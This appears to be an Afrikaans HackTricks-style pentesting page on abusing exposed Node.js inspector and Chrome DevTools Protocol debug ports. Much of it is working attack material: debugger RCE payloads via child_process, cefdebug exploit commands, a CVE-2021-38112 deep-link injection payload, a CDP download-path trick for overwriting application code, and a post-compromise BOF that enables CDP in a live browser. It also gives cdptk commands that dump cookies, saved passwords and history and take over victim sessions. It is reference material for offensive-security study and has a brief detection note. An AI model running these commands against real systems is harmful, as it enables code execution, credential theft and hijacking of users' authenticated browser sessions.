# Node inspector/CEF-debugmisbruik

{{#include ../../banners/hacktricks-training.md}}

Historiese praktiese voorbeelde sluit die Multimaster-deurloop en die CVE-2019-1414 Visual Studio Code-debuggeraanval in; gebruik hulle as weergawe-spesifieke konteks eerder as om aan te neem dat elke huidige Electron- of Chromium-teiken dieselfde primitiewe blootstel.<sup>[[1]](#references)[[3]](#references)</sup>

## Basiese inligting

[Uit die dokumentasie](https://nodejs.org/learn/getting-started/debugging): Wanneer ’n Node.js-proses met die `--inspect`-skakelaar begin word, luister dit vir ’n debuggerkliënt. By **verstek** luister dit op gasheer en poort **`127.0.0.1:9229`**. Elke proses kry ook ’n **unieke** **UUID** toegeken.<sup>[[4]](#references)</sup>

Inspector-kliënte moet die gasheeradres, poort en UUID ken en spesifiseer om te koppel. ’n Volledige URL sal ongeveer soos `ws://127.0.0.1:9229/0f2c936f-b1cd-4ac9-aab3-f63b0f33d55e` lyk.<sup>[[4]](#references)</sup>

> [!WARNING]
> Omdat die **debugger volle toegang tot die Node.js-uitvoeringsomgewing het**, kan ’n kwaadwillige akteur wat aan hierdie poort kan koppel moontlik arbitrêre kode namens die Node.js-proses uitvoer (**moontlike voorregte-eskalasie**).<sup>[[4]](#references)</sup>

Daar is verskeie maniere om ’n inspector te begin:<sup>[[4]](#references)</sup>

```bash
node --inspect app.js #Will run the inspector in port 9229
node --inspect=4444 app.js #Will run the inspector in port 4444
node --inspect=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
node --inspect-brk=0.0.0.0:4444 app.js #Will run the inspector all ifaces and port 4444
# --inspect-brk also pauses at the start of the user script

node --inspect --inspect-port=0 app.js #Will run the inspector in a random port
# Note that using "--inspect-port" without "--inspect" or "--inspect-brk" won't run the inspector
```

Wanneer jy ’n geïnspekteerde proses begin, sal iets soos dit verskyn:<sup>[[4]](#references)</sup>

```
Debugger ending on ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
For help, see: https://nodejs.org/en/docs/inspector
```

Prosesse gebaseer op **CEF** (**Chromium Embedded Framework**) kan ’n debugger met `--remote-debugging-port=9222` blootstel. Dit stel die blaaier beskikbaar via die [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) eerder as ’n Node.js-inspekteur, dus is Node.js-`process`-gebaseerde payloads nie by verstek direk toepasbaar nie.<sup>[[2]](#references)[[5]](#references)</sup>

Wanneer jy ’n browser met debugging begin, sal iets soos hierdie verskyn:<sup>[[2]](#references)[[5]](#references)</sup>

```
DevTools listening on ws://127.0.0.1:9222/devtools/browser/7d7aa9d9-7c61-4114-b4c6-fcf5c35b4369
```

### Enumerering en beheer van 'n CDP endpoint

Die HTTP-ontdekkingsendpunte onderskei die **browser** WebSocket van individuele **target** (oortjie, worker, uitbreiding, ens.) WebSockets. Doen navraag by `/json/version` vir die browser-endpoint en `/json/list` vir targets; die teruggestuurde `webSocketDebuggerUrl`-waardes kan dan direk beheer word met CDP se JSON-RPC-agtige boodskappe.<sup>[[5]](#references)</sup>

```bash
# Browser metadata and browser-level WebSocket
curl -s http://127.0.0.1:9222/json/version | jq

# Pages/workers and their target-level WebSockets
curl -s http://127.0.0.1:9222/json/list |
  jq '.[] | {id, type, title, url, webSocketDebuggerUrl}'

BROWSER_WS=$(curl -s http://127.0.0.1:9222/json/version | jq -r .webSocketDebuggerUrl)
PAGE_WS=$(curl -s http://127.0.0.1:9222/json/list | jq -r '[.[] | select(.type=="page")][0].webSocketDebuggerUrl')
```

Byvoorbeeld, koppel met `websocat "$BROWSER_WS"` en stuur `{"id":1,"method":"Target.getTargets"}` of `{"id":2,"method":"Storage.getCookies"}`. Op ’n page target (`websocat "$PAGE_WS"`), voer `Runtime.evaluate` kode in daardie renderer uit en gee `Page.captureScreenshot` ’n base64-geënkodeerde skermskoot terug. `document.cookie` kan nie `HttpOnly`-koekies onthul nie, terwyl `Storage.getCookies` die blaaier se koekiestoor navraag.<sup>[[5]](#references)</sup>

```json
{"id":3,"method":"Runtime.evaluate","params":{"expression":"({url:location.href,title:document.title,cookie:document.cookie})","returnByValue":true}}
{"id":4,"method":"Page.captureScreenshot","params":{"format":"png"}}
```

### Blaaiers, WebSockets en same-origin-policy <a href="#browsers-websockets-and-same-origin-policy" id="browsers-websockets-and-same-origin-policy"></a>

Webwerwe wat in ’n webblaaier oopgemaak word, kan WebSocket- en HTTP-versoeke volgens die blaaiersekuriteitsmodel stuur. ’n **Aanvanklike HTTP-verbinding** is nodig om **’n unieke debugger-sessie-ID te verkry**. Die **same-origin-policy** **verhoed** dat webwerwe **hierdie HTTP-verbinding** kan maak. Vir bykomende sekuriteit teen [**DNS rebinding attacks**](https://en.wikipedia.org/wiki/DNS_rebinding)**,** verifieer Node.js dat die **'Host'-headers** vir die verbinding óf ’n **IP-adres** óf presies **`localhost`** spesifiseer.<sup>[[4]](#references)</sup>

> [!TIP]
> Hierdie **sekuriteitsmaatreël verhoed dat die inspector uitgebuit word** om kode uit te voer deur **bloot ’n HTTP-versoek te stuur** (wat gedoen kan word deur ’n SSRF vuln uit te buit).<sup>[[4]](#references)</sup>

### Inspector in lopende prosesse begin

Jy kan die **sein SIGUSR1** na ’n lopende nodejs-proses stuur om dit die **inspector** op die verstekpoort te laat begin. Let egter daarop dat jy genoeg voorregte moet hê; dit kan jou dus **bevoorregte toegang tot inligting binne die proses** gee, maar nie direkte privilege escalation nie.<sup>[[4]](#references)</sup>

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```

> [!TIP]
> Dit is nuttig in containers omdat **die proses afskakel en ’n nuwe een met `--inspect` begin** **nie ’n opsie is nie**, aangesien die **container** saam met die proses **beëindig sal word**.<sup>[[6]](#references)</sup>

### Koppel aan inspector/debugger

Om aan ’n **Chromium-gebaseerde blaaier** te koppel, kan die `chrome://inspect`- of `edge://inspect`-URL’s onderskeidelik vir Chrome of Edge besoek word. Deur op die Configure-knoppie te klik, moet seker gemaak word dat die **teikengasheer en -poort** korrek gelys word. Die prent wys ’n Remote Code Execution (RCE)-voorbeeld:<sup>[[2]](#references)[[4]](#references)</sup>

![Nadat ’n URL om toegang tot die debugger te verkry verskyn het. bv. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d - Koppel aan inspector/debugger: Om aan ’n Chromium-gebaseerde blaaier te koppel, ...](<../../images/image (674).png>)

Met die **opdragreël** kan jy aan ’n debugger/inspector koppel met:<sup>[[2]](#references)[[4]](#references)</sup>

```bash
node inspect <ip>:<port>
node inspect 127.0.0.1:9229
# RCE example from debug console
debug> exec("process.mainModule.require('child_process').exec('/Applications/iTerm.app/Contents/MacOS/iTerm2')")
```

Die nutsmiddel [**https://github.com/taviso/cefdebug**](https://github.com/taviso/cefdebug) maak dit moontlik om **inspectors** te vind wat plaaslik loop en **code** daarin in te spuit.<sup>[[2]](#references)</sup>

```bash
#List possible vulnerable sockets
./cefdebug.exe
#Check if possibly vulnerable
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.version"
#Exploit it
./cefdebug.exe --url ws://127.0.0.1:3585/5a9e3209-3983-41fa-b0ab-e739afc8628a --code "process.mainModule.require('child_process').exec('calc')"
```

> [!TIP]
> Let daarop dat **NodeJS RCE-exploits nie sal werk nie** as jy via [**Chrome DevTools Protocol**](https://chromedevtools.github.io/devtools-protocol/) aan ’n browser gekoppel is (jy moet die API nagaan om interessante dinge te vind wat jy daarmee kan doen).<sup>[[2]](#references)[[5]](#references)</sup>

## RCE in NodeJS Debugger/Inspector

> [!TIP]
> As jy hierheen gekom het om uit te vind hoe om [**RCE vanaf ’n XSS in Electron te kry, kyk asseblief na hierdie bladsy.**](../../desktop-application-security/electron-desktop-apps/index.html)

Sommige algemene maniere om **RCE** te verkry wanneer jy aan ’n Node **inspector** kan **koppel**, is om iets soos die volgende te gebruik (dit lyk asof dit **nie met ’n verbinding met Chrome DevTools Protocol sal werk nie):**<sup>[[2]](#references)</sup>

```javascript
process.mainModule.require("child_process").exec("calc")
window.appshell.app.openURLInDefaultBrowser("c:/windows/system32/calc.exe")
require("child_process").spawnSync("calc.exe")
Browser.open(JSON.stringify({ url: "c:\\windows\\system32\\calc.exe" }))
```

## Chrome DevTools Protocol Payloads

Jy kan die API hier nagaan: [https://chromedevtools.github.io/devtools-protocol/](https://chromedevtools.github.io/devtools-protocol/).<sup>[[5]](#references)</sup>
In hierdie afdeling lys ek bloot interessante dinge wat ek gevind het wat mense gebruik het om hierdie protokol uit te buit.

### Chrome 136+ verstekprofielbeperking

Vanaf **Chrome 136** ignoreer Chrome `--remote-debugging-port` en `--remote-debugging-pipe` wanneer hulle op die **verstek Chrome-datagids** gerig is. Die skakelaar moet saam met ’n nie-standaard `--user-data-dir` gebruik word; die aparte enkripsiesleutel en geïsoleerde blaaierstatus daarvan voorkom dat die eenvoudige vlaggebaseerde tegniek die gebruiker se normale geverifieerde profiel blootlê. Daar moet nie sonder verifikasie aanvaar word dat hierdie Chrome-spesifieke beperking ook ouer Chrome-weergawes, Chrome for Testing, Electron/CEF-toepassings of ander Chromium-afgeleides dek nie.<sup>[[14]](#references)</sup>

```bash
# Valid current-Chrome debugging setup, but this is a new isolated profile
google-chrome --remote-debugging-port=9222 --user-data-dir=/tmp/chrome-cdp-lab
```

Daarom bewys dit **nie** dat CDP aktief geword het as jy ’n huidige Chrome-proses sien wat slegs met `--remote-debugging-port` geloods is nie. Bevestig die listener en `/json/version`, en bepaal watter profiel dit eintlik gebruik.<sup>[[14]](#references)</sup>

### Parameter Injection via Deep Links

In [**CVE-2021-38112**](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/) het Rhino Security ontdek dat ’n toepassing gebaseer op CEF ’n pasgemaakte URI**I** (workspaces://index.html) in die stelsel **geregistreer het wat die volledige URI ontvang het en daarna die CEF-gebaseerde toepassin**g** met ’n konfigurasie geloods het wat gedeeltelik uit daardie URI saamgestel is.<sup>[[8]](#references)</sup>

Daar is ontdek dat die URI-parameters URL-gedekodeer is en gebruik is om die CEF-basis-toepassing te loods. Dit het ’n gebruiker toegelaat om die vlag **`--gpu-launcher`** in die **opdragreël** te **inject** en arbitrêre dinge uit te voer.<sup>[[8]](#references)</sup>

Dus, ’n payload soos:

```
workspaces://anything%20--gpu-launcher=%22calc.exe%22@REGISTRATION_CODE
```

Sal calc.exe uitvoer.<sup>[[8]](#references)</sup>

### Oorskryf lêers

Verander die vouer waarin **afgelaaide lêers gestoor gaan word** en laai ’n lêer af om die toepassing se gereeld gebruikte **broncode** met jou **kwaadwillige kode** te **oorskryf**.<sup>[[5]](#references)[[6]](#references)</sup>

```javascript
ws = new WebSocket(url) //URL of the chrome devtools service
ws.send(
  JSON.stringify({
    id: 42069,
    method: "Browser.setDownloadBehavior",
    params: {
      behavior: "allow",
      downloadPath: "/code/",
    },
  })
)
```

### Webdriver RCE and exfiltration

STAR Labs het gewys dat blootgestelde WebDriver/CDP-dienste arbitrêre lêerlesings en RCE kan moontlik maak; DNS-rebinding kan die uitbuitingsketting in sommige konfigurasies voltooi.<sup>[[9]](#references)</sup>

ChromeDriver se WebDriver-diens verskil van Chrome DevTools/CDP. Die [`goog:chromeOptions.binary`-vermoë](https://developer.chrome.com/docs/chromedriver/capabilities) kies die blaaieruitvoerbare lêer wat vir ’n nuwe sessie begin word. As ’n onbevoorregte oproeper toegang kan kry tot ’n ChromeDriver-diens wat as root loop en ’n sessie met ’n uitvoerbare lêerpad wat deur die oproeper beheer word, kan indien, kan die begin daarvan die diens se voorreggrens oorskry. ’n Leë `/sessions`-antwoord bepaal nie of nuwe sessies geskep kan word nie. Ondersoek die proseseienaar, werklike bereikbaarheid van die luisteraar, sessiemagtiging, toegang tot die uitvoerbare lêer en inperking voordat jy besluit dat die roete bruikbaar is; ’n prosesnaam of gewone poort alleen is nie voldoende nie. [Google se sekuriteitsriglyne](https://developer.chrome.com/docs/chromedriver/security-considerations) sê dat ChromeDriver onder ’n onbevoorregte rekening moet loop. Passiewe enumerasie behoort nie ’n WebDriver-sessie te skep nie.

Vir bykomende historiese gevalle rakende blaaieroutomatisering en Chromium-sekuriteit, sien die Counter WebDriver-skrywe en Project Zero-kwessies 773, 1742 en 1944.<sup>[[10]](#references)[[11]](#references)[[12]](#references)[[13]](#references)</sup>

### CDP in ’n lopende Chromium-proses aktiveer

Chrome se verstekprofielbeperking blokkeer slegs die aktiveringsroete via die opdragreël. Met voldoende toegang as dieselfde gebruiker om die blaaierproses te manipuleer, roep die oorspronklike [**CDP-Enabler**](https://github.com/deathflamingo/CDP-Enabler) en die Cobalt Strike [**CDP-Enable-BOF**](https://github.com/kingofthenops/CDP-Enable-BOF) Chromium se nie-uitgevoerde `content::DevToolsAgentHost::StartRemoteDebuggingServer` binne die reeds lopende `chrome.exe` of `msedge.exe` aan. Die eindpunt behoort dus aan die werklike profiel en behou die oortjies, uitbreidings, koekies en geverifieerde toestand daarvan.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

Vir gewone x64 Chrome/Edge-prosesse vind die BOF die blaaiervenster en die gelaaide `chrome.dll`/`msedge.dll`, soek dit deur die afgeleë PE vir gemaskerde handtekeninge, ken dit geheuestompies en ’n konteksblok toe, vervang dit tydelik die vensterprosedure en stuur dit die finale oproep op die blaaier se **UI-draad**. Die relevante looptydinsette is `StartRemoteDebuggingServer`, Chromium se `operator new`, `TCPServerSocketFactory::CreateForHttpServer` en die fabriek-vtabel. Uitvoering stop tensy elke verpligte handtekening ’n unieke passing het.<sup>[[15]](#references)[[16]](#references)</sup>

Die BOF aanvaar ’n blaaiertipe en ’n opsionele poort. Sy hulpskrip kan daarna die eindpunt verifieer en koekies versamel; `chrome-iso` is ’n afsonderlike roete vir Chrome se Windows Process Isolation-grens.<sup>[[16]](#references)</sup>

```text
cdp-enable chrome
cdp-enable edge 9301
cdp-enable chrome-iso
python .\grab_cookies.py --port 9222 --output cookies.json
```

Die `chrome-iso`-pad gebruik slegs handles met beperkte navraagtoegang tot die geïsoleerde proses. Dit identifiseer die geïnstalleerde `chrome.dll` waarvan die PE-imagegrootte ooreenstem met dié van die lewendige proses, los simbole uit daardie plaaslike image op, en gebruik Chromium se `WindowImpl`-dispatch plus sinchroniese `WM_COPYDATA` en ’n bestaande User32-hook in die image om die UI-thread te bereik.<sup>[[16]](#references)</sup>

> [!WARNING]
> Dit is ’n **manipulasietegniek vir die blaaierproses ná ’n kompromittering**, nie ’n netwerkomseiling sonder verifikasie nie. Dit is afhanklik van die build, omdat die relevante C++-simbole nie uitgevoer word nie en ná blaaieropdaterings kan verander.<sup>[[15]](#references)[[16]](#references)[[18]](#references)</sup>

#### Handtekeninge bywerk ná blaaieropdaterings

Gebruik die presiese weergawe van `chrome.dll` of `msedge.dll` wat op die teiken geïnstalleer is, asook die ooreenstemmende PDB. `symchk.exe` uit die Windows SDK laai die simbole af; die repository-skripte spoor dan `StartRemoteDebuggingServer` op, lei die allocator-/socket-factory-insette af, of valideer elke handtekening wat in die BOF ingebed is.<sup>[[16]](#references)[[18]](#references)</sup>

```powershell
# Run from a directory containing the exact target DLL
& 'C:\Program Files (x86)\Windows Kits\10\Debuggers\x64\symchk.exe' /v chrome.dll /s 'srv*C:\symbols*https://chromium-browser-symsrv.commondatastorage.googleapis.com'
symchk /v /ocx edge-symchk.txt /s 'SRV*C:\symbols*https://msdl.microsoft.com/download/symbols' .\msedge.dll

python .\find_start_server.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll 'C:\symbols\...\chrome.dll.pdb'
python .\find_cdp_inputs.py .\chrome.dll --validate-bof-signatures
```

’n Nul-treffer- of veelvuldige-treffer-resultaat moet nie deur ’n arbitrêre adres vervang word nie. As ’n bekende `operator new`- of `CreateForHttpServer`-patroon te veel verander het om ’n nuwe masker te maak, gebruik `pe_signature_finder.py` saam met die PDB om daardie simbool te ondersoek en ’n greepvolgorde af te lei wat uniek in die teikenmodule is.<sup>[[16]](#references)[[18]](#references)</sup>

#### Uittrekking via ’n geverifieerde blaaier met CDP Toolkit

Hierdie tegniek dekripteer nie App-Bound Encryption (ABE) vanlyn of verwyder toestelbinding nie. Dit behandel eerder die wettige blaaier as ’n **dekripsie-orakel en geverifieerde interaksie-proxy**: `Storage.getCookies` vra die lewendige blaaier vir sy koekiestoor, terwyl navigasie-/skermuitsending-werkvloeie versoeke, berging, ondernemingsverifikasie en toestelgebonde gedrag binne die slagoffer se bestaande blaaier hou.<sup>[[17]](#references)[[18]](#references)</sup>

Nadat die loopback-CDP-luisteraar deur die operateur se pivot gerouteer is, kan [**CDP Toolkit**](https://github.com/kingofthenops/CDP-toolkit) algemene artefakte opspoor en versamel.<sup>[[17]](#references)[[18]](#references)</sup>

```powershell
pip install -e .
cdptk discover --cdp-endpoint http://127.0.0.1:9222
cdptk tabs list --cdp-endpoint http://127.0.0.1:9222
cdptk cookies dump --cdp-endpoint http://127.0.0.1:9222 --out cookies.json
cdptk tabs screenshot 1 --cdp-endpoint http://127.0.0.1:9222 --out tab.png
cdptk history search azure --cdp-endpoint http://127.0.0.1:9222 --limit 50
cdptk bookmarks list --cdp-endpoint http://127.0.0.1:9222 --out bookmarks.json
cdptk saved-passwords list --cdp-endpoint http://127.0.0.1:9222
cdptk extensions list --cdp-endpoint http://127.0.0.1:9222
```

`discover`, `tabs list`, `cookies dump` en `tabs screenshot` is meestal wrappers om `/json/version`, die teikenlys, `Storage.getCookies` en `Page.captureScreenshot`. Vir geskiedenis, boekmerke, uitbreidings en wagwoordmetadata is daarenteen ’n tydelike `chrome://`-/`edge://`-WebUI-teiken nodig: die toolkit wag totdat die oppervlak weergegee is, inspekteer die model of DOM, versamel die resultaat en sluit die teiken.<sup>[[17]](#references)[[18]](#references)</sup>

`saved-passwords dump` gaan verder: dit maak die oorsprong van die werklike gestoorde aanmelding oop, fokus ’n geloofsbrieffeld, kies die inheemse outovulvoorstel met CDP-invoergebeure en lees die ingevulde waardes. Die oorsprong/poort/pad moet nou ooreenstem met die gestoorde wagwoordrealm; sigbare modus is die betroubare verstek omdat die voorstelopspringvenster inheemse blaaier-UI is.<sup>[[17]](#references)[[18]](#references)</sup>

Vir regstreekse interaksie stroom `browser-takeover screencast` rame en stuur dit invoer na ’n werklike teiken (insluitend agtergrond- of buiteskermmodusse). `browser-takeover proxy` aanvaar eerder HTTP en HTTPS `CONNECT` plaaslik en maak stroomopversoeke deur versteekte Chrome-teikens, met terugval na agtergrondoortjies waar versteekte teikens nie beskikbaar is nie; dit behou die slagoffer se netwerk-/stawingskonteks, maar is minder getrou vir komplekse kliëntkanttoepassings omdat die operateur se blaaier die teruggestuurde inhoud weergee.<sup>[[17]](#references)[[18]](#references)</sup>

Vir opsporing, moenie net op `--remote-debugging-*`-opdragreëltelemetrie staatmaak nie: korreleer ook ongewone handles en geheuebewerkings teen blaaierprosesse (`PROCESS_VM_OPERATION`, `PROCESS_VM_WRITE`, draadskepping), DLL-inspuiting en onverwagte luister-sokke op die loopback-koppelvlak wat deur Chrome/Edge besit word.<sup>[[15]](#references)</sup>

### Post-Exploitation

In ’n werklike omgewing en **nadat ’n gebruiker se rekenaar wat ’n Chromium-gebaseerde blaaier gebruik gekompromitteer is**, was ’n historiese tegniek om die blaaier met debugging geaktiveer te herbegin en die loopback-poort aan te stuur. Dit kan die slagoffer se blaaiestand blootlê op produkte/bouweergawes wat steeds die gekose profiel aanvaar, maar Chrome 136+ sal dit nie teen sy verstekdatagids aanvaar nie.<sup>[[7]](#references)[[14]](#references)</sup>

Die oorspronklike herbeginopdrag word hieronder vir ouer/weergawe-spesifieke teikens behou. Die tweede opdrag is die ondersteunde vorm vir huidige Chrome, maar dit skep ’n geïsoleerde profiel eerder as om die slagoffer se normale geverifieerde toestand te heropen.<sup>[[7]](#references)[[14]](#references)</sup>

```powershell
# Historical: verify whether the target actually honors it
Start-Process "Chrome" "--remote-debugging-port=9222 --restore-last-session"

# Current Chrome: CDP works, but against a new profile
Start-Process "Chrome" "--remote-debugging-port=9222 --user-data-dir=$env:TEMP\chrome-cdp"
```

Vir Chromium-herbegin, uitbreidings en CDP-tegnieke spesifiek vir macOS, sien [macOS Chromium Injection](../../macos-hardening/macos-security-and-privilege-escalation/macos-proces-abuse/macos-chromium-injection.md).



## References

- [1] [HackTheBox - Multimaster (IppSec)](https://www.youtube.com/watch?v=iwR746pfTEc&t=6345s)
- [2] [taviso/cefdebug - CEF/Chromium-debuggerinspeksie- en exploitationsinstrument](https://github.com/taviso/cefdebug)
- [3] [CVE-2019-1414: Visual Studio Code Remote Code Execution via Chrome DevTools Debugger](https://iwantmore.pizza/posts/cve-2019-1414.html)
- [4] [Node.js-debugginggids - Aan die gang](https://nodejs.org/learn/getting-started/debugging)
- [5] [Chrome DevTools Protocol](https://chromedevtools.github.io/devtools-protocol/)
- [6] [corCTF 2021 Writeup - saasme (Larry Yuan)](https://larry.science/post/corctf-2021/#saasme-2-solves)
- [7] [Post-Exploitation: Misbruik van Chrome se debugging-funksie om blaaisessies op afstand waar te neem en te beheer](https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/)
- [8] [CVE-2021-38112: AWS WorkSpaces Remote Code Execution](https://rhinosecuritylabs.com/aws/cve-2021-38112-aws-workspaces-rce/)
- [9] [Praat jy met my? - WebDriver RCE via DNS Rebinding en CDP (STAR Labs)](https://starlabs.sg/blog/2021/04-you-talking-to-me/)
- [10] [Counter Webdriver - Van bot tot RCE](https://medium.com/@knownsec404team/counter-webdriver-from-bot-to-rce-b5bfb309d148)
- [11] [Google Project Zero-kwessie 773 (Chromium-foutspoorder)](https://bugs.chromium.org/p/project-zero/issues/detail?id=773)
- [12] [Google Project Zero-kwessie 1742 (Chromium-foutspoorder)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1742)
- [13] [Google Project Zero-kwessie 1944 (Chromium-foutspoorder)](https://bugs.chromium.org/p/project-zero/issues/detail?id=1944)
- [14] [Veranderinge aan skakelaars vir afstandsdebugging om sekuriteit te verbeter - Chrome for Developers](https://developer.chrome.com/blog/remote-debugging-port)
- [15] [CDP in 'n lopende Edge-blaaier invoeg: 'n diepgaande blik op Runtime Browser Instrumentation](https://deathflamingo.com/blog/cdp_enabler/)
- [16] [kingofthenops/CDP-Enable-BOF](https://github.com/kingofthenops/CDP-Enable-BOF)
- [17] [kingofthenops/CDP-toolkit](https://github.com/kingofthenops/CDP-toolkit)
- [18] [SpecterOps - Die terugkeer van die Cookie Monster](https://specterops.io/blog/2026/08/13/chrome-devtools-protocol-cookie-theft/)
{{#include ../../banners/hacktricks-training.md}}
